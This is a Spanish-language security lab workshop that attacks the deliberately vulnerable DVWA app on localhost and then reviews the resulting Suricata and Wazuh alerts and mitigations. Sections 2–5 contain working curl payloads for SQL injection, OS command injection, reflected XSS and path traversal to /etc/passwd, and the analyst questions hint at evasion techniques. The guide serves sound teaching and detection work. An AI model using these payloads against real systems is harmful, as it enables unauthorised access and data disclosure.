# Taller: Hacking Web y Deteccion por Firma de Red

Este taller guia una practica completa: explotar cuatro fallas clasicas en una aplicacion web vulnerable, generar trafico malicioso real y revisar la evidencia defensiva que captura Suricata y le entrega a Wazuh.

La diferencia clave respecto al [taller de APIs](api-breach.md): aqui la deteccion no depende de eventos que genera la aplicacion. Depende de **firmas de red** que Suricata identifica al inspeccionar el trafico HTTP, sin importar si la app registra algo o no.

Para explorar DVWA sin seguir el taller, lee la guia de servicio en [DVWA](../services/dvwa.md).

## Requisitos

- Servicio `opsn-dvwa` iniciado.
- Servicio `opsn-docs` iniciado para leer esta guia dentro del lab.
- Recomendado para deteccion: `opsn-wazuh` y `opsn-suricata`.
- Terminal con `curl`.
- Puerto DVWA por defecto: `8080`.

## Objetivos

Al terminar, debes poder explicar:

- Que es SQL Injection y como se dispara en un formulario vulnerable.
- Como Command Injection permite ejecutar comandos del sistema operativo.
- Que es XSS reflejado y como viaja en la URL.
- Como File Inclusion expone archivos del servidor via la ruta.
- Por que Suricata puede detectar estos ataques sin leer los logs de la aplicacion.
- Que limitaciones tienen las firmas basadas en patron.
- Que mitigaciones reducen el riesgo de cada vulnerabilidad.

## 1. Preparar DVWA

Antes de atacar, DVWA necesita su base de datos inicializada y el nivel de seguridad en `Low`.

### 1.1 Iniciar sesion

Abre `http://localhost:8080` en el navegador o verifica que responde:

```bash
curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/login.php
```

Salida esperada: `200`

Credenciales: `admin` / `password`

### 1.2 Configurar la base de datos

Navega a `http://localhost:8080/setup.php` y haz clic en **Create / Reset Database**. DVWA mostrara un mensaje de exito y redirigira al login.

Inicia sesion nuevamente con `admin` / `password`.

### 1.3 Establecer nivel de seguridad Low

Navega a `http://localhost:8080/security.php`, selecciona **Low** y guarda. Con este nivel las vulnerabilidades no tienen ningun filtro.

### 1.4 Obtener cookie de sesion para curl

Para los ataques via `curl` necesitas una cookie de sesion activa. Ejecuta:

```bash
# Obtener token CSRF del formulario de login
USER_TOKEN=$(curl -sc /tmp/dvwa.txt http://localhost:8080/login.php \
  | grep -oP 'user_token.*?value=.\K[^"'"'"']+')

# Autenticar y guardar la cookie
curl -sb /tmp/dvwa.txt -c /tmp/dvwa.txt \
  -X POST http://localhost:8080/login.php \
  -d "username=admin&password=password&Login=Login&user_token=${USER_TOKEN}" \
  -L -o /dev/null

echo "Cookie lista. Sesion activa."
```

> Si prefieres usar el navegador para los pasos 1.1 a 1.3 y solo usar curl para los ataques, puedes exportar la cookie desde las DevTools. Para simplicidad del taller, los comandos de ataque que siguen incluyen `-b /tmp/dvwa.txt`.

## 2. SQL Injection

SQL Injection ocurre cuando la entrada del usuario se concatena directamente en una consulta SQL sin validacion ni parametrizacion.

### Ataque

```bash
curl -s -b /tmp/dvwa.txt \
  "http://localhost:8080/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit" \
  | grep -o "<pre>.*</pre>" | head -5
```

Observacion esperada:

- La respuesta incluye multiples registros de usuarios de la base de datos.
- La condicion `1'='1` siempre es verdadera, devolviendo todas las filas.
- Suricata detecta el patron de inyeccion en el parametro `id` de la URL.

## 3. Command Injection

Command Injection ocurre cuando la aplicacion ejecuta comandos del sistema operativo concatenando parametros de usuario sin validacion.

### Ataque

```bash
curl -s -b /tmp/dvwa.txt \
  -X POST http://localhost:8080/vulnerabilities/exec/ \
  -d "ip=127.0.0.1%3Bid&Submit=Submit" \
  | grep -oP "(?s)<pre>.*?</pre>" | head -1
```

Observacion esperada:

- La respuesta incluye la salida del `ping` a `127.0.0.1` seguida de la salida del comando `id`.
- El separador `;` encadena el segundo comando al primero.
- En la salida veras `uid=` con el usuario bajo el que corre el servidor web.

## 4. XSS Reflejado

Cross-Site Scripting reflejado ocurre cuando la aplicacion incluye parametros de la URL directamente en el HTML de respuesta sin codificarlos.

### Ataque

```bash
curl -s -b /tmp/dvwa.txt \
  "http://localhost:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" \
  | grep -o "<script>.*</script>"
```

Observacion esperada:

- La respuesta incluye el tag `<script>alert(1)</script>` sin modificar.
- Un navegador real ejecutaria el JavaScript. En el contexto del taller, `curl` solo muestra el codigo fuente.
- Suricata detecta la secuencia `<script>` en el parametro de la URL.

## 5. File Inclusion

File Inclusion ocurre cuando la aplicacion construye una ruta de archivo usando parametros de usuario sin restringir los caracteres de directorio.

### Ataque

```bash
curl -s -b /tmp/dvwa.txt \
  "http://localhost:8080/vulnerabilities/fi/?page=../../../../etc/passwd" \
  | grep -oP "root:.*?(?=<)" | head -3
```

Observacion esperada:

- La respuesta incluye el contenido de `/etc/passwd` del contenedor.
- La secuencia `../../../../` navega fuera del directorio de la aplicacion.
- Suricata detecta el patron de path traversal en el parametro `page`.

## 6. Investigar la deteccion en Wazuh

Cada ataque que disparaste genero trafico que Suricata inspeccionó y convirtio en alertas. Wazuh ingiere esas alertas y las indexa. Abre **Wazuh Dashboard** (`https://localhost:5601`, `admin`/`admin`) → **Discover**, selecciona el index pattern `wazuh-alerts-*`.

### 6.1 Encontrar tus alertas

Filtra por el grupo de reglas de Suricata:

```text
rule.groups: suricata
```

Deberias ver cuatro alertas correspondientes a tus cuatro ataques:

| Firma Suricata | Ataque | Que detecta |
| --- | --- | --- |
| `OpenSecLab - SQL Injection en DVWA` | SQLi | Patron de inyeccion SQL en parametro HTTP. |
| `OpenSecLab - Command Injection en DVWA` | Command Injection | Separador de comando (`;`) en campo POST. |
| `OpenSecLab - XSS en DVWA` | XSS reflejado | Tag `<script>` en parametro de URL. |
| `OpenSecLab - File Inclusion en DVWA` | File Inclusion | Secuencia `../` en parametro de ruta. |

> Las firmas aparecen en el campo `data.alert.signature` de cada alerta. La regla Wazuh que las envuelve es `rule.id: 86601`, grupos `[ids, suricata]`.

### 6.2 Leer una alerta como analista

Abre la alerta de SQLi y observa estos campos:

- `data.alert.signature` — el nombre de la firma que disparo Suricata.
- `data.alert.category` — la categoria de la firma (p. ej. `Web Application Attack`).
- `data.src_ip` y `data.dest_ip` — origen y destino del trafico.
- `data.proto` y `data.dest_port` — protocolo y puerto destino.
- `rule.description` — descripcion de la regla Wazuh que envolvo la alerta.

### 6.3 Preguntas de analista

- ¿Por que Suricata detecta estos ataques sin acceso a los logs de DVWA? ¿Que ventaja da eso para el defensor?
- Las firmas de Suricata buscan patrones especificos en el trafico. ¿Que tecnicas podria usar un atacante para evadir una firma basada en patron? (pista: encoding alternativo, fragmentacion de paquetes, variantes del payload.)
- Si el nivel de seguridad de DVWA estuviera en `High`, ¿cambiaria la deteccion en Suricata? ¿Por que?

> Si las alertas no aparecen: Suricata puede tardar 1–2 minutos en cargar sus reglas al iniciar. Wazuh puede tardar 1–3 minutos en indexar tras recibir las alertas. Repite la busqueda despues de esperar.

## Mitigaciones

### SQL Injection

- Usar consultas parametrizadas (prepared statements) en lugar de concatenacion de strings.
- Nunca construir SQL con entrada del usuario directamente.

### Command Injection

- Evitar llamadas a `exec`, `shell_exec`, `system` o similares con entrada de usuario.
- Si el sistema operativo es necesario, usar una allowlist de valores permitidos y rechazar todo lo demas.

### XSS Reflejado

- Codificar la salida HTML: reemplazar `<`, `>`, `"`, `'`, `&` por sus entidades HTML antes de incluirlos en la respuesta.
- Aplicar una Content Security Policy (CSP) que bloquee scripts inline.

### File Inclusion

- No usar parametros de usuario para construir rutas de archivos.
- Si es inevitable, usar una allowlist de archivos permitidos y rechazar cualquier otra entrada.
- Configurar `open_basedir` en PHP para limitar el acceso al sistema de archivos.

## Reset rapido

La forma mas simple: en el menu del lab (`~/OpenSec_Lab/opensec-lab.sh`), elige
la opcion **15) Reset del taller**. Reinicia los componentes del lado azul y
limpia las alertas del taller en Wazuh.

Para reiniciar solo DVWA al estado inicial (resetear la base de datos):

```bash
curl -s -b /tmp/dvwa.txt http://localhost:8080/setup.php \
  -X POST -d "create_db=Create+%2F+Reset+Database" -o /dev/null
```

O navega a `http://localhost:8080/setup.php` y haz clic en **Create / Reset Database** desde el navegador.

> Wazuh indexa con 1-3 min de retraso. Si reseteas justo despues de atacar, alguna
> alerta "en vuelo" puede sobrevivir; vuelve a correr el reset (opcion 15) para barrerla.
